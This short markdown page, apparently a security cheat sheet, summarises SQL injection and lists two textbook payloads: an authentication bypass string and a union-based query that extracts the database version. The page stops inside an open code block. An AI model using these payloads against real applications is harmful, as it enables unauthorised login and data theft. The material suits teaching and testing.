# SQL Injection (SQLi)

## 1. Executive Summary
Detailed analysis of SQL Injection vulnerabilities where malicious SQL statements are inserted into entry fields for execution against underlying databases.

## 2. Practical Exploit Payloads
```sql
-- Authentication Bypass Payload
' OR '1'='1

-- Union-Based Data Extraction
' UNION SELECT null, version() -- -
